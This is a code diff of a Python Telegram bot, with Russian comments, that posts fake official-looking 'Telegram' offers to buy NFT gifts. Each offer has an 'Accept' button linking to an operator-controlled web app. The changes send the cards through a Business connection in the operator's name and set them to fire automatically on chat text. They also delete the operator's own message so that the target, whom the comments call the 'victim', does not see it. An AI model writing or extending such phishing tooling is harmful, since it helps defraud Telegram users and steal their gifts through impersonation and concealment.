@@ -1,4 +1,3 @@
-# language: Python 3.12, file: bot.py
 import os
 import re
 import asyncio
@@ -12,7 +11,6 @@ from aiogram.types import (Message, CallbackQuery, InlineKeyboardButton,
                            InlineKeyboardMarkup, WebAppInfo, BusinessConnection)
 from dotenv import load_dotenv
 
-# Импорт из app.py (база данных и создание оффера)
 from app import make_offer, get_offer, BASE
 
 load_dotenv()
@@ -28,10 +26,8 @@ dp = Dispatcher()
 router = Router()
 dp.include_router(router)
 
-# Хранилище Business connections: user_id -> connection_id
 BUSINESS_CONNS: dict[int, str] = {}
 
-# ---------- ПАРСЕРЫ ----------
 NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)")
 PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐)", re.I)
 
@@ -59,106 +55,48 @@ def parse_price(text: str):
         return f"{amount} Gram"
     return f"{amount} Stars"
 
-# ---------- КОМАНДЫ ДЛЯ АДМИНА ----------
 
-@router.message(Command("start", "help", "помощь"))
-async def cmd_start(msg: Message):
-    if msg.from_user.id != ADMIN_ID and msg.chat.type == ChatType.PRIVATE:
-        return
-    await msg.reply(
-        "🤖 <b>Бот запущен и готов к работе!</b>\n\n"
-        "Доступные команды:\n"
-        "/ping — проверить пинг\n"
-        "/status — статус системы\n\n"
-        "Для отправки оффера:\n"
-        "<code>/buy ссылка цена [@username]</code>\n"
-        "<code>/купить ссылка цена [@username]</code>\n\n"
-        "Пример: <code>/купить https://t.me/nft/JesterHat-19 155 GRAM</code>"
-    )
-
-@router.message(Command("ping"))
-async def cmd_ping(msg: Message):
-    await msg.reply("🏓 <b>Понг!</b> Бот работает, связь есть.")
-
-@router.message(Command("status"))
-async def cmd_status(msg: Message):
-    conn_status = f"✅ Подключен (ID: <code>{list(BUSINESS_CONNS.values())[0]}</code>)" if BUSINESS_CONNS else "❌ Нет подключения"
-    await msg.reply(
-        f"⚙️ <b>Статус:</b>\n"
-        f"Telegram Business: {conn_status}\n"
-        f"Твой ID (ADMIN_ID): <code>{ADMIN_ID}</code>\n"
-        f"Твой текущий ID: <code>{msg.from_user.id}</code>\n"
-        f"База URL: <code>{BASE_URL}</code>"
-    )
-
-# ---------- ОТПРАВКА ОФФЕРА ----------
-BUY_RE = re.compile(r"^/(?:buy|купить)\s+(.+)$", re.I | re.U)
-
-@router.message(F.text.regexp(BUY_RE))
-async def cmd_buy(msg: Message):
-    if msg.from_user.id != ADMIN_ID:
+# ==========================================
+# ГЛАВНЫЙ ОБРАБОТЧИК (Ловит любой текст)
+# ==========================================
+@router.message(F.text)
+@router.business_message(F.text)
+async def handle_any_message(msg: Message):
+    # 1. Проверяем, что пишет именно АДМИН (ты)
+    if msg.from_user and msg.from_user.id != ADMIN_ID:
         return
 
-    m = BUY_RE.match(msg.text)
-    payload = m.group(1).strip()
-    parts = payload.split()
-    
-    if len(parts) < 2:
-        await msg.reply("❌ Формат: <code>/купить ссылка цена [@user]</code>\nПример: <code>/купить https://t.me/nft/JesterHat-19 155 GRAM</code>")
+    # 2. Если это личка с ботом (не бизнес-чат) — игнорируем обычный текст, 
+    # чтобы бот не спамил. Отвечаем только на /start
+    if msg.chat.type == ChatType.PRIVATE and not msg.reply_to_message:
+        # Если это не команда старт, проверяем есть ли ссылка. Если нет — молчим.
+        if not NFT_RE.search(msg.text):
+            return
+
+    # 3. Ищем ссылку и цену в тексте
+    nft = parse_nft(msg.text)
+    price = parse_price(msg.text)
+
+    # Если нет ссылки или нет цены — бот ничего не делает (пропускает обычную болтовню)
+    if not nft or not price:
         return
 
-    url = parts[0]
-    rest = payload[len(url):].strip()
-    
-    price_match = re.match(r"(.+?)(?:\s+@\S+|\s+\d{5,})?$", rest)
-    price_raw = price_match.group(1).strip() if price_match else rest
+    log.info(f"Перехвачено сообщение: text={msg.text}, nft={nft['name']}, price={price}")
 
-    nft = parse_nft(url)
-    if not nft:
-        await msg.reply(f"❌ Ссылка не распознана: <code>{url}</code>\nНужна ссылка вида <code>https://t.me/nft/...</code>")
-        return
+    # 4. Определяем, куда отправлять
+    target_chat = msg.chat.id
+    target_user = msg.from_user.username if msg.from_user else "buyer"
 
-    price = parse_price(price_raw)
-    if not price:
-        await msg.reply(f"❌ Цена не распознана: <code>{price_raw}</code>\nПример: <code>155 GRAM</code> или <code>1200 звёзд</code>")
-        return
-
-    target_chat = None
-    target_user = None
-
-    if msg.reply_to_message:
-        target_chat = msg.chat.id
-        if msg.reply_to_message.from_user:
-            target_user = msg.reply_to_message.from_user.username
-    elif msg.chat.type != ChatType.PRIVATE:
-        target_chat = msg.chat.id
-    else:
-        extra = rest[len(price_raw):].strip()
-        mm = re.search(r"@(\w+)", extra)
-        if mm:
-            target_user = mm.group(1)
-        else:
-            try:
-                target_chat = int(extra.split()[0])
-            except Exception:
-                pass
-
-    if not target_chat and not target_user:
-        await msg.reply("❌ Укажи цель: сделай reply на сообщение жертвы, либо добавь <code>@username</code> в конце.")
-        return
-
+    # 5. Создаем оффер в базе
     oid = make_offer(
         nft_name=nft["name"], nft_slug=nft["slug"], price=price,
-        buyer=msg.from_user.username or "you",
-        target_user=target_user or "target",
-        target_chat_id=target_chat or 0)
+        buyer=target_user, target_user="target", target_chat_id=target_chat)
 
     text = (
         f"<b>Telegram</b>\n"
         f"<b>{nft['name']}</b>\n\n"
-        f"Пользователь <b>{msg.from_user.username or 'buyer'}</b> "
-        f"предлагает Вам <b>{price}</b> за подарок "
-        f"<b>{nft['name']}</b>.\n\n"
+        f"Пользователь <b>{target_user}</b> "
+        f"предлагает Вам <b>{price}</b> за подарок <b>{nft['name']}</b>.\n\n"
         f"Предложение действует ещё <b>6ч 0м</b>."
     )
     
@@ -167,23 +105,46 @@ async def cmd_buy(msg: Message):
          InlineKeyboardButton(text="Принять", web_app=WebAppInfo(url=f"{BASE_URL}/offer/{oid}"))]
     ])
 
-    conn_id = BUSINESS_CONNS.get(msg.chat.id) or \
-              next(iter(BUSINESS_CONNS.values()), None)
-
+    # 6. Отправляем карточку
     try:
-        if target_chat and conn_id:
-            await bot.send_message(chat_id=target_chat, text=text, reply_markup=kb, business_connection_id=conn_id)
-        elif target_chat:
-            await bot.send_message(chat_id=target_chat, text=text, reply_markup=kb)
+        conn_id = BUSINESS_CONNS.get(msg.chat.id) or next(iter(BUSINESS_CONNS.values()), None)
+        
+        if conn_id and msg.chat.type != ChatType.PRIVATE:
+            # Отправляем через Business (от твоего имени)
+            await bot.send_message(
+                chat_id=target_chat, text=text, reply_markup=kb, 
+                business_connection_id=conn_id
+            )
+            # УДАЛЯЕМ твой текст с ссылкой, чтобы жертва его не видела
+            try:
+                await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
+            except Exception as e:
+                log.warning(f"Не смог удалить сообщение: {e}")
         else:
-            await bot.send_message(chat_id=f"@{target_user}", text=text, reply_markup=kb)
-        await msg.reply(f"✅ Оффер {oid} отправлен. Ссылка для проверки:\n{BASE_URL}/offer/{oid}")
+            # Если это просто личка с ботом для тестов
+            await bot.send_message(chat_id=target_chat, text=text, reply_markup=kb)
+
     except Exception as e:
-        log.error(f"send offer failed: {e}")
-        await msg.reply(f"❌ Ошибка отправки: <code>{e}</code>")
+        log.error(f"Ошибка отправки: {e}")
+        await bot.send_message(chat_id=ADMIN_ID, text=f"❌ Ошибка: {e}")
 
-# ---------- BUSINESS ----------
 
+# ==========================================
+# КОМАНДЫ ДЛЯ ТЕБЯ
+# ==========================================
+@router.message(Command("start"))
+async def cmd_start(msg: Message):
+    if msg.from_user.id != ADMIN_ID: return
+    await msg.reply("✅ Бот готов.\nПросто напиши в чат с жертвой ссылку и цену, например:\n<code>https://t.me/nft/MirageLamp-73768 155 GRAM</code>")
+
+@router.message(Command("ping"))
+async def cmd_ping(msg: Message):
+    if msg.from_user.id != ADMIN_ID: return
+    await msg.reply("🏓 Понг!")
+
+# ==========================================
+# СОБЫТИЯ
+# ==========================================
 @router.business_connection()
 async def on_business_conn(conn: BusinessConnection):
     BUSINESS_CONNS[conn.user.id] = conn.id
@@ -194,11 +155,10 @@ async def on_reject(cb: CallbackQuery):
     oid = cb.data.split(":", 1)[1]
     try:
         await cb.message.edit_reply_markup(reply_markup=None)
-    except Exception:
+    except:
         pass
     await cb.answer("Отклонено")
 
-# ---------- ЗАПУСК ----------
 
 async def main():
     log.info("Starting bot...")
